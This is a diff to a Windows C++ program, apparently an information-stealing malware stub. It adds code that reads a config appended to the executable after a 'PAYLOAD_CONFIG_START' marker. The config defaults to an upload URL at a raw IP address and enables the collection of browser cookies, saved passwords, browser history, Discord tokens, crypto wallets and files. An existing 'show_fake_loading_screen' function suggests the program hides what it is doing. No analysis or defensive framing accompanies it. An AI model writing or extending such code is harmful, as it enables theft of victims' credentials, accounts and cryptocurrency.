@@ -5,10 +5,16 @@
 #include <vector>
 #include <thread>
 #include <chrono>
+#include <fstream>
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include <nlohmann/json.hpp>
 
 #pragma comment(lib, "ws2_32.lib")
+
+// Magic marker to find embedded config at end of exe
+// This unique string marks where the JSON config begins
+static const char* CONFIG_MARKER = "<<<PAYLOAD_CONFIG_START>>>";
 
 std::string get_current_date_time() {
     auto now = std::chrono::system_clock::now();
@@ -117,5 +123,84 @@ void show_fake_loading_screen(const std::string& user) {
             std::cout << "█";
         }
         std::cout << std::endl; // New line after progress bar
+    }
+}
+
+std::string get_exe_path() {
+    char path[MAX_PATH];
+    DWORD length = GetModuleFileNameA(nullptr, path, MAX_PATH);
+    if (length == 0 || length == MAX_PATH) {
+        return "";
+    }
+    return std::string(path);
+}
+
+std::optional<EmbeddedConfig> read_embedded_config() {
+    try {
+        std::string exePath = get_exe_path();
+        if (exePath.empty()) {
+            return std::nullopt;
+        }
+
+        // Open the exe file in binary mode
+        std::ifstream file(exePath, std::ios::binary | std::ios::ate);
+        if (!file.is_open()) {
+            return std::nullopt;
+        }
+
+        // Get file size
+        std::streamsize fileSize = file.tellg();
+        if (fileSize < 100) { // Too small to have embedded config
+            return std::nullopt;
+        }
+
+        // Read the last 64KB of the file to search for marker
+        // Config should be small, so 64KB is more than enough
+        const std::streamsize searchSize = std::min(fileSize, static_cast<std::streamsize>(65536));
+        file.seekg(-searchSize, std::ios::end);
+
+        std::vector<char> buffer(searchSize);
+        file.read(buffer.data(), searchSize);
+        file.close();
+
+        // Search for the marker in the buffer
+        std::string bufferStr(buffer.begin(), buffer.end());
+        size_t markerLen = strlen(CONFIG_MARKER);
+        size_t markerPos = bufferStr.find(CONFIG_MARKER);
+        
+        if (markerPos == std::string::npos) {
+            return std::nullopt; // No embedded config found
+        }
+
+        // Extract JSON after marker
+        std::string jsonStr = bufferStr.substr(markerPos + markerLen);
+        
+        // Trim any trailing null bytes or whitespace
+        size_t endPos = jsonStr.find_last_not_of("\0\r\n\t ");
+        if (endPos != std::string::npos) {
+            jsonStr = jsonStr.substr(0, endPos + 1);
+        }
+
+        // Parse JSON config
+        nlohmann::json config = nlohmann::json::parse(jsonStr);
+
+        EmbeddedConfig embeddedConfig;
+        embeddedConfig.user = config.value("user", "west");
+        embeddedConfig.serverUrl = config.value("serverUrl", "http://62.60.179.121/api/upload");
+        embeddedConfig.collectLocation = config.value("collectLocation", true);
+        embeddedConfig.collectSystemInfo = config.value("collectSystemInfo", true);
+        embeddedConfig.collectRunningProcesses = config.value("collectRunningProcesses", true);
+        embeddedConfig.collectInstalledApps = config.value("collectInstalledApps", true);
+        embeddedConfig.collectBrowserCookies = config.value("collectBrowserCookies", true);
+        embeddedConfig.collectSavedPasswords = config.value("collectSavedPasswords", true);
+        embeddedConfig.collectBrowserHistory = config.value("collectBrowserHistory", true);
+        embeddedConfig.collectDiscordTokens = config.value("collectDiscordTokens", true);
+        embeddedConfig.collectCryptoWallets = config.value("collectCryptoWallets", true);
+        embeddedConfig.collectImportantFiles = config.value("collectImportantFiles", true);
+
+        return embeddedConfig;
+
+    } catch (const std::exception&) {
+        return std::nullopt;
     }
 }
